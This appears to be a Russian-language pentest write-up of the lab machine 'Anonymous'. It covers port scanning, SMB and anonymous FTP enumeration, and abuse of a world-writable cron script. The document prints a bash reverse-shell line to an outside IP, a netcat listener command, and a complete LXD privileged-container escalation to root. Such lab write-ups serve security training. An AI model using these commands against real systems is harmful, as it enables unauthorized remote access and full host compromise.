**Отчет о пентесте машины Anonymous**

**Цель:** Получение полного доступа к системе (root) на машине Anonymous.


### 1. Разведка и обнаружение уязвимостей

**1.1. Сканирование сети**  
Первым этапом проведено сканирование портов с использованием Nmap. Обнаружены следующие открытые порты:

- **21/tcp** – FTP (анонимный доступ разрешён)
- **22/tcp** – SSH (OpenSSH)
- **139/tcp** – SMB (NetBIOS)
- **445/tcp** – SMB (Samba)

**1.2. Анализ SMB-шар**  
С помощью `smbclient` выполнено перечисление доступных шар:

```
print$          Disk      Printer Drivers
pics            Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```

Из шары `pics` скачаны два изображения:

- `corgo2.jpg`
- `puppos.jpeg`

**1.3. Стеганография**  
Попытки извлечь скрытые данные из изображений с помощью `steghide` и `stegseek` не увенчались успехом.

**1.4. Анализ FTP**  
Через анонимный FTP-доступ получены следующие файлы:

| Файл | Права | Размер | Дата |
|------|-------|--------|------|
| `clean.sh` | `-rwxr-xrwx` | 314 | Jun 04 2020 |
| `removed_files.log` | `-rw-rw-r--` | 1505 | Sep 16 04:31 |
| `to_do.txt` | `-rw-r--r--` | 68 | May 12 2020 |

**Содержимое `clean.sh`:**

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

**Вывод:** Файл `clean.sh` имеет права `-rwxr-xrwx`, что позволяет **любому пользователю** изменять его. Скрипт, вероятно, выполняется по cron от имени другого пользователя.


### 2. Эксплуатация уязвимости и получение доступа

**2.1. Внедрение reverse shell в `clean.sh`**  
Файл `clean.sh` изменён через FTP:

```bash
echo 'bash -i >& /dev/tcp/192.168.129.121/4444 0>&1' > clean.sh
put clean.sh
```

**2.2. Получение shell**  
Запущен слушатель на Kali:

```bash
nc -nlvp 4444
```

После выполнения cron-задания получен reverse shell от пользователя `namelessone`:

```
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

**Вывод:** Пользователь `namelessone` состоит в группе `lxd`, что является вектором для эскалации привилегий.


### 3. Эскалация привилегий через LXD

**3.1. Подготовка образа Alpine**  
На атакующей машине собран образ Alpine Linux:

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
```

**3.2. Импорт образа и запуск контейнера**  
Образ передан на целевую машину. Выполнены следующие команды:

```bash
lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

**3.3. Получение root**  
После выполнения команд получен root-доступ к файловой системе хоста.


### 4. Итоговый вывод

В ходе пентеста машины Anonymous были успешно реализованы следующие этапы:

1. **Разведка:** Сканирование портов, анализ SMB-шар, анонимный FTP-доступ, анализ cron-скрипта.
2. **Получение доступа:** Внедрение reverse shell в `clean.sh` через FTP, получение shell от пользователя `namelessone`.
3. **Эскалация привилегий:** Использование группы `lxd` для запуска привилегированного контейнера и получения root-доступа к хосту.